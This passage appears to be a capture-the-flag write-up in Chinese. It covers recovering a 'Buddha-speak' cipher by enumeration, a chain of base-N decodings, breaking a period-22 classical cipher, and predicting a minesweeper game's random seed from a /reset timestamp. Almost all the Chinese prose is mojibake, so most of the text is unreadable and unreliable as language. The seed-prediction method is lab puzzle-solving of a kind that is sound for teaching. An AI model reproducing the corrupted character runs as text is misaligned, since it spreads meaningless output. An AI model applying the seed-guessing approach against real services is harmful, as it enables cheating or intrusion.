
```python
possibleUTF8Chars = TUDOU + BYTEMARK + ["ï¼š"]
for c in possibleUTF8Chars:
    if len(c.encode("utf-8")[:2].decode("shift-jis",errors="ignore").encode("shift-jis")) < 2:
        print(c)
# result:
# ï¼š
```

### è¿˜åŸä½›è¯­

æ³¨æ„åˆ°ä½¿ç”¨äº†CBCåˆ†ç»„ç¼–ç ï¼Œæˆ‘ä»¬å¯ä»¥æ¯æ¬¡æšä¸¾ä¸€ä¸ªåˆ†ç»„å¯¹åº”çš„æ‰€æœ‰å¯èƒ½çš„å­ä½›è¯­ä¸²ï¼Œå°†å®ƒä»¬åˆ†åˆ«ä¸**å·²ç¡®å®šçš„å‰ç¼€ä½›è¯­ä¸²**æ‹¼æ¥ï¼Œè¿›è¡Œè§£å¯†ï¼Œç­›é€‰å‡ºè§£å¯†åæ‰€æœ‰å­—ç¬¦éƒ½æ˜¯ASCIIçš„ï¼ŒåŠ å…¥åˆ°**å·²ç¡®å®šçš„å‰ç¼€ä½›è¯­ä¸²**ã€‚

è€ƒè™‘åˆ°æˆ‘ä»¬å·²ç»å¯ä»¥ç¡®å®šå“ªäº›å­—èŠ‚å±äºåŒä¸€ä¸ªä½›è¯­å­—ç¬¦ï¼Œåªè¦åˆ¤æ–­å­—èŠ‚åºåˆ—æ˜¯ä¸æ˜¯ä½›è¯­å­—ç¬¦UTF-8ç¼–ç çš„å­åºåˆ—ï¼Œå³å¯ç­›é€‰æ‰å¾ˆå¤šä¸å¯èƒ½çš„ä½›è¯­å­—ç¬¦ã€‚

æœç´¢çš„ä»£ç å·²é™„åœ¨`buddEnc`ç›®å½•ä¸­

### è¿˜åŸåŸæ–‡

Flag1çš„ä½›è¯­ç›´æ¥ç»è¿‡Decryptå³å¯å¾—åˆ°åŸæ–‡

Flag2çš„ä½›è¯­ç»è¿‡Decryptå¯ä»¥å¾—åˆ°ä¸€ä¸ªæ˜æ˜¾æ˜¯base32çš„ä¸²ã€‚æ ¹æ®äº”ç§ç¼–ç çš„ç‰¹å¾ï¼Œæ¥ä¸‹æ¥å‡ æ­¥å¯ä»¥è‚‰çœ¼è§‚å¯Ÿå‡ºä½¿ç”¨äº†ä½•ç§ç¼–ç ç®—æ³•ã€‚æˆ‘çš„10ä¸ªæŒ‰è§£ç é¡ºåºä¾æ¬¡ä¸ºb32,a85,b85,b16,a85,b64,a85,b64,a85,b64ã€‚è§£ç åå‘ç°åŸæ–‡æ˜¯é¢˜é¢ä¸­çš„æ–‡å­—ï¼Œflagå°±éšè—åœ¨å…¶ä¸­ã€‚

## å¥‡æ€ªçš„åŠ å¯†-Flag1

åŸºäºçš„å‡è®¾æ˜¯ï¼ŒåŒä¸€ç¯‡æ–‡ç« ä¸­ï¼Œå¾ˆé•¿çš„å•è¯å¾€å¾€æ˜¯åŒä¸€ä¸ªã€‚

æˆ‘åˆ†åˆ«è·å–äº†é•¿åº¦9~12å¹¶ä¸”åœ¨å¯†æ–‡ä¸­å‡ºç°å¤šäºä¸€æ¬¡çš„å•è¯ï¼Œè®¡ç®—å‡ºäº†ä¸€ä¸ªå¾ªç¯çš„å‘¨æœŸä¸º22ï¼Œå¹¶æ ¹æ®è¿™äº›å•è¯æ¨ç®—å‡ºäº†æ•´ä¸ªå¾ªç¯

```python
targets = ["glsipbqapech","zaceywtrykbg","ohpsaingacyt","qloxehmgomn","spaonxrwmm","bmxqlzhniy","qzglsiphnk",
	"zzctyneor","ttzklcrnh","dnzssrfgi","dhiwwboyn"]
```

ä»£ç é™„åœ¨äº†`classicalEnc`ç›®å½•

## æ‰«é›·

ä»£ç é™„åœ¨äº†`mineSweeper`ç›®å½•

### Flag1

æ³¨æ„åˆ°`/reset`æ¥å£å¯ä»¥è‡ªå·±é€‰æ‹©é‡ç½®éšæœºæ•°çš„æ—¶æœºï¼Œæˆ‘ä»¬å¯ä»¥å‡è®¾è°ƒç”¨`reset`æ—¶çš„æœ¬åœ°æ—¶é—´æˆ³ä¸æœåŠ¡å™¨çš„æ—¶é—´æˆ³å‡ ä¹ä¸€è‡´ã€‚æ³¢åŠ¨åœ¨-100ms~100msä¹‹é—´ã€‚

åˆæ³¨æ„åˆ°è¸©é›·åé‡æ–°ç”Ÿæˆæ£‹ç›˜æ—¶ï¼Œä¸ä¼šé‡ç½®éšæœºæ•°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè¸©ä¸€æ¬¡é›·ï¼Œè·å¾—ç¬¬ä¸€ä¸ªæ£‹ç›˜çš„å®Œæ•´ä¿¡æ¯ï¼Œæšä¸¾è°ƒç”¨`/reset`æ—¶çš„æ—¶é—´æˆ³åŠ å‡100èŒƒå›´å†…çš„æ‰€æœ‰éšæœºç§å­ï¼Œçœ‹å“ªä¸ªèƒ½ç”Ÿæˆå¯¹åº”çš„æ£‹ç›˜ã€‚ç”¨è¯¥éšæœºç§å­ç”Ÿæˆç¬¬äºŒä¸ªæ£‹ç›˜å³å¯

### Flag2

securerandçš„ç¡®å®‰å…¨ï¼Œä½†æ˜¯èŒƒå›´ä¸å¤§ï¼Œå¯ä»¥æšä¸¾ã€‚é€šè¿‡ç¼“å­˜åŒä¸€ä¸ªéšæœºç§å­äº§ç”Ÿçš„éšæœºæ•°ï¼Œå¯ä»¥åŠ å¿«æšä¸¾é€Ÿåº¦ã€‚

### Flag3

æ³¨æ„åˆ°å—åˆ°Securerandå½±å“çš„æ ¼å­å¾ˆå°‘ï¼Œå¯ä»¥ç”¨å…¶ä»–æ ¼å­å®Œæˆéšæœºç§å­çš„åŒ¹é…ï¼Œç„¶åç‚¹ä¸Šå¯ç‚¹çš„ä½ç½®ï¼Œæ ¹æ®å·²çŸ¥æ£‹ç›˜ä¿¡æ¯æ‰‹æ¨ã€‚
